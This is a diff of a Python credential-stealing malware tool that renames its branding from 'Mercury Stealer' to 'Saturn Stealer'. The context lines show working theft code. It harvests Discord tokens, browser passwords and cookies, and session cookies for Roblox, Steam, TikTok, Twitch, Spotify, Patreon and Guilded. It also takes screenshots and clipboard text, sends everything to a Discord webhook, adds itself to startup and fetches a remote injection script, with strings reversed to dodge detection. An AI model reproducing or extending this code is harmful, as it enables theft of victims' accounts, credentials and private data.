@@ -46,7 +46,7 @@ catbox = '%CatBoxMoeYesOrNo%'
 if Startup == False:
     StartupMessage = 'Adding to startup disabled in the config'
 else:
-    StartupMessage = 'Error while adding Mercury into the startup folder' 
+    StartupMessage = 'Error while adding Saturn into the startup folder' 
     
 requirements = [
     ["requests", "requests"],
@@ -342,18 +342,18 @@ def steal_driver():
                     
                     data = {
                 
-                "username": "Mercury Stealer",
+                "username": "Saturn Stealer",
                 "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                 "embeds": [
                     {
-                        "title": "ðﾟﾍﾪ Mercury Stealer USB Drivers",
+                        "title": "ðﾟﾍﾪ Saturn Stealer USB Drivers",
                         "description": f"Browser Drivers Files\n{upload}",
                         "color": 0xffb6c1,
                         "thumbnail": {
                             "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                         },
                         "footer": {
-                            "text": "Mercury Stealer",
+                            "text": "Saturn Stealer",
                             "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                         }
                     }
@@ -396,7 +396,7 @@ def ArchiSteamFarm():
             zip_filename = zip_config_folders(found_folders, "ArchiSteamFarmConf")
             file_url = upload_file(zip_filename)
             data = {
-                    "username": "Mercury Stealer",
+                    "username": "Saturn Stealer",
                     "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                     "embeds": [
                         {
@@ -410,7 +410,7 @@ def ArchiSteamFarm():
                                 "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                             },
                             "footer": {
-                                "text": "Mercury Stealer",
+                                "text": "Saturn Stealer",
                                 "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                             }
                         }
@@ -583,7 +583,7 @@ def idisc():
         ind = "sj.xedni"
         global webhook
 
-        inj_url = f"https://raw.githubusercontent.com/TheCuteOwl/Mercury-Stealer/main/{ind[::-1]}"
+        inj_url = f"https://raw.githubusercontent.com/TheCuteOwl/Saturn-Stealer/main/{ind[::-1]}"
 
         folder_list = [f'{Desc}', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
         for folder_name in folder_list:
@@ -821,7 +821,7 @@ Autofill = []
 def writeforfile(data, name):
     path = os.getenv("TEMP") + fr"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"Mercury Stealer\n\n")
+        f.write(f"Saturn Stealer\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -1022,12 +1022,12 @@ def TikTokSession(cookie):
 
 
         data = {
-            "username": "Mercury Stealer",
+            "username": "Saturn Stealer",
             "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
             "content": "",
             "embeds": [
                 {
-                    "title": f"ðﾟﾍﾪ Mercury Stealer Tiktok Session",
+                    "title": f"ðﾟﾍﾪ Saturn Stealer Tiktok Session",
                     "description": f"Founded user information ! :\n",
                     "color": 0xffb6c1,
                     "author": {
@@ -1035,7 +1035,7 @@ def TikTokSession(cookie):
                         "icon_url": pfp
                     },
                     "footer": {
-                        "text": "Mercury Stealer",
+                        "text": "Saturn Stealer",
                         "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                     },
                     "thumbnail": {
@@ -1304,12 +1304,12 @@ def uploadTokq(Tokq, path):
     tok = 'nekoT'
     em = 'liamE'
     data = {
-        "username": "Mercury Stealer",
+        "username": "Saturn Stealer",
         "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
         "content": "",
         "embeds": [
             {
-                "title": f"ðﾟﾍﾪ Mercury Stealer {tok[::-1]}",
+                "title": f"ðﾟﾍﾪ Saturn Stealer {tok[::-1]}",
                 "description": f"`Path` : {path}\n",
                 "color": 0xffb6c1,
                 "author": {
@@ -1317,7 +1317,7 @@ def uploadTokq(Tokq, path):
                     "icon_url": pfp
                 },
                 "footer": {
-                    "text": "Mercury Stealer",
+                    "text": "Saturn Stealer",
                     "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                 },
                 "thumbnail": {
@@ -1681,18 +1681,18 @@ def histup():
         yrk = upload_file(zip_file_name)
         data = {
             
-            "username": "Mercury Stealer",
+            "username": "Saturn Stealer",
             "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
             "embeds": [
                 {
-                    "title": "ðﾟﾍﾪ Mercury Stealer History",
+                    "title": "ðﾟﾍﾪ Saturn Stealer History",
                     "description": f"Browser History File\n{yrk}",
                     "color": 0xffb6c1,
                     "thumbnail": {
                         "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                     },
                     "footer": {
-                        "text": "Mercury Stealer | https://github.com/TheCuteOwl",
+                        "text": "Saturn Stealer | https://github.com/TheCuteOwl",
                         "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                     }
                 }
@@ -1812,19 +1812,19 @@ def getinfo():
             useri = useri.result()
 
             data = {
-                "username": "Mercury Stealer",
+                "username": "Saturn Stealer",
                 "content": "@everyone someone launched it",
                 "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                 "embeds": [
                     {
-                        "title": "ðﾟﾍﾪ Mercury Stealer Information",
+                        "title": "ðﾟﾍﾪ Saturn Stealer Information",
                         "description": f"{globalinfo}\n\n**ðﾟﾑﾀ Even more information** : \n {sysinfo}\n\n**Startup** : `{StartupMessage}`\nMore Info : `Info.txt` \n[Click here to download]({useri})\nClipboard text : ```{clipboardtext}```",
                         "color": 0xffb6c1,
                         "thumbnail": {
                             "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                         },
                         "footer": {
-                            "text": "Mercury Stealer | https://github.com/TheCuteOwl",
+                            "text": "Saturn Stealer | https://github.com/TheCuteOwl",
                             "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                         }
                     }
@@ -1862,7 +1862,7 @@ def steam_st():
 
             file = {"file": open(f"{os.environ['TEMP']}\\steam_session.zip", "rb")}
             data = {
-                "username": "Mercury Stealer",
+                "username": "Saturn Stealer",
                 "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                 "content": "Here the Steam Session file"
             }
@@ -1919,12 +1919,12 @@ def upload_files_to_discord():
         embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]
 
         data = {
-            "username": "Mercury Stealer",
+            "username": "Saturn Stealer",
             "content": "",
             "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
             "embeds": [
                 {
-                    "title": "ðﾟﾍﾪ Mercury Stealer Files",
+                    "title": "ðﾟﾍﾪ Saturn Stealer Files",
                     "description": "New files have been uploaded:",
                     "color": 0xffb6c1,
                     "fields": embed_fields,
@@ -1932,7 +1932,7 @@ def upload_files_to_discord():
                         "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                     },
                     "footer": {
-                        "text": "Mercury Stealer | https://github.com/TheCuteOwl",
+                        "text": "Saturn Stealer | https://github.com/TheCuteOwl",
                         "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                     }
                 }
@@ -2064,7 +2064,7 @@ def Upload_Whatsapp():
 
 
         data = {
-                "username": "Mercury Stealer",
+                "username": "Saturn Stealer",
                 "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                 "embeds": [
                     {
@@ -2078,7 +2078,7 @@ def Upload_Whatsapp():
                             "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                         },
                         "footer": {
-                            "text": "Mercury Stealer | https://github.com/TheCuteOwl",
+                            "text": "Saturn Stealer | https://github.com/TheCuteOwl",
                             "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                         }
                     }
@@ -2210,7 +2210,7 @@ def srcs():
             with open(screenshot_path, "rb") as file:
                 file_data = file.read()
                 data = {
-                    "username": "Mercury Stealer",
+                    "username": "Saturn Stealer",
                     "content": "Screen was successfully taken",
                     "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
                 }
@@ -2271,12 +2271,12 @@ def paaz(filetype):
 
         try:
             data = {
-                "username": "Mercury Stealer",
+                "username": "Saturn Stealer",
                 "content": "",
                 "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                 "embeds": [
                     {
-                        "title": f"ðﾟﾍﾪ Mercury Stealer {'drowssaP'[::-1]} and cookies",
+                        "title": f"ðﾟﾍﾪ Saturn Stealer {'drowssaP'[::-1]} and cookies",
                         "description": f"Number of {pas[::-1]} : {PasswCount}\nNumber of cookies : {CookiCount}\nNumber of autofill item : {Autofill_count}",
                         "color": 0xffb6c1,
                         "fields": [
@@ -2288,7 +2288,7 @@ def paaz(filetype):
                             "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
                         },
                         "footer": {
-                            "text": "Mercury Stealer | https://github.com/TheCuteOwl",
+                            "text": "Saturn Stealer | https://github.com/TheCuteOwl",
                             "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                         }
                     }
@@ -2375,7 +2375,7 @@ def GetAll(UserID: int) -> list:
     except Exception as e:
         return []
 
-def GeMercury(UserID):
+def GeSaturn(UserID):
 
     ErroredRAP = 0
     TotalValue = 0
@@ -2409,7 +2409,7 @@ def roblox(cookie):
         username, userId,robux,thumbnail, premium, builderclub = baseinf["UserName"], baseinf["UserID"], baseinf["RobuxBalance"],baseinf["ThumbnailUrl"], baseinf["IsPremium"],baseinf["IsAnyBuildersClubMember"]
         
         friendlist = GetAll(userId)
-        rap = GeMercury(userId)
+        rap = GeSaturn(userId)
         
         if premium == True:
             premium = '✅'
@@ -2437,19 +2437,19 @@ def roblox(cookie):
         days_passed = round(seconds_passed / (24 * 60 * 60))
 
         data = {
-            "username": "Mercury Stealer",
+            "username": "Saturn Stealer",
             "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
             "content": "",
             "embeds": [
                 {
-                    "title": f"ðﾟﾍﾪ Mercury Stealer Roblox",
+                    "title": f"ðﾟﾍﾪ Saturn Stealer Roblox",
                     "description": f"Cookie Founded ! : `{cookie}`\n",
                     "color": 0xffb6c1,
                     "author": {
                         "name": f"{username} ({userId})\n",
                     },
                     "footer": {
-                        "text": "Mercury Stealer",
+                        "text": "Saturn Stealer",
                         "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                     },
                     "thumbnail": {
@@ -2560,12 +2560,12 @@ def guilded(cookie):
         join = response["user"]["joinDate"] if response["user"]["joinDate"] else "Couldn't get join date"
         bio = response["user"]["aboutInfo"]["tagLine"] if response["user"]["aboutInfo"]["tagLine"] else "Couldn't get user bio"
         data = {
-                "username": "Mercury Stealer",
+                "username": "Saturn Stealer",
                 "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
                 "content": "",
                 "embeds": [
                     {
-                        "title": f"ðﾟﾍﾪ Mercury Stealer Guilded Session",
+                        "title": f"ðﾟﾍﾪ Saturn Stealer Guilded Session",
                         "description": f"Founded user information ! :\n",
                         "color": 0xffb6c1,
                         "author": {
@@ -2573,7 +2573,7 @@ def guilded(cookie):
                             "icon_url": 'https://cdn3.emoji.gg/emojis/3304_astolfobean.png'
                         },
                         "footer": {
-                            "text": "Mercury Stealer",
+                            "text": "Saturn Stealer",
                             "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                         },
                         "thumbnail": {
@@ -2652,12 +2652,12 @@ def patreon(cookie):
             social_connection_names = "\n".join([f"{key.capitalize()}" for key in non_null_social_connections])
 
         data = {
-                "username": "Mercury Stealer",
+                "username": "Saturn Stealer",
                 "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
                 "content": "",
                 "embeds": [
                     {
-                        "title": f"ðﾟﾍﾪ Mercury Stealer Patreon Session",
+                        "title": f"ðﾟﾍﾪ Saturn Stealer Patreon Session",
                         "description": f"Founded user information ! :\n",
                         "color": 0xffb6c1,
                         "author": {
@@ -2665,7 +2665,7 @@ def patreon(cookie):
                             "icon_url": image
                         },
                         "footer": {
-                            "text": "Mercury Stealer",
+                            "text": "Saturn Stealer",
                             "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                         },
                         "thumbnail": {
@@ -2774,12 +2774,12 @@ def twitch_session(auth_token, username):
         bits = response["data"]["user"]["bitsBalance"] if response["data"]["user"]["bitsBalance"] else "0"
         sub = response["data"]["user"]["followers"]["totalCount"] if response["data"]["user"]["followers"]["totalCount"] else "Coudn't get followers numbers"
         data = {
-            "username": "Mercury Stealer",
+            "username": "Saturn Stealer",
             "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
             "content": "",
             "embeds": [
                 {
-                    "title": f"ðﾟﾍﾪ Mercury Stealer Twitch Session",
+                    "title": f"ðﾟﾍﾪ Saturn Stealer Twitch Session",
                     "description": f"Founded user information ! :\n",
                     "color": 0xffb6c1,
                     "author": {
@@ -2787,7 +2787,7 @@ def twitch_session(auth_token, username):
                         "icon_url": pfp
                     },
                     "footer": {
-                        "text": "Mercury Stealer",
+                        "text": "Saturn Stealer",
                         "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                     },
                     "thumbnail": {
@@ -2878,12 +2878,12 @@ def spotify(cookie):
         date = time.strftime("%Y-%m-%d", time.localtime(timestamp))
 
         data = {
-                "username": "Mercury Stealer",
+                "username": "Saturn Stealer",
                 "avatar_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
                 "content": "",
                 "embeds": [
                     {
-                        "title": f"ðﾟﾍﾪ Mercury Stealer Spotify Session",
+                        "title": f"ðﾟﾍﾪ Saturn Stealer Spotify Session",
                         "description": f"Founded user information ! :\n",
                         "color": 0xffb6c1,
                         "author": {
@@ -2891,7 +2891,7 @@ def spotify(cookie):
                             "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                         },
                         "footer": {
-                            "text": "Mercury Stealer",
+                            "text": "Saturn Stealer",
                             "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                         },
                         "thumbnail": {
@@ -3130,15 +3130,15 @@ def GatherZips(paths1, paths2, paths3):
         data = {
                 "embeds": [
                     {
-                        "title": "Mercury Stealer Zips",
+                        "title": "Saturn Stealer Zips",
                         "description": f"{wal}\n{ga}\n{ot}",
                         "color": 0xffb6c1,
                         "footer": {
-                            "text": "Mercury Stealer ZIP",
+                            "text": "Saturn Stealer ZIP",
                             "icon_url": "https://images-ext-2.discordapp.net/external/t2jmsVmF2FvFLwOKUYc8jVDiBS32FDKP7pdFuepWwMU/https/cdn3.emoji.gg/emojis/3304_astolfobean.png"}
                     }
                 ],
-                "username": "Mercury Stealer",
+                "username": "Saturn Stealer",
                 "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
                 "attachments": []
             }
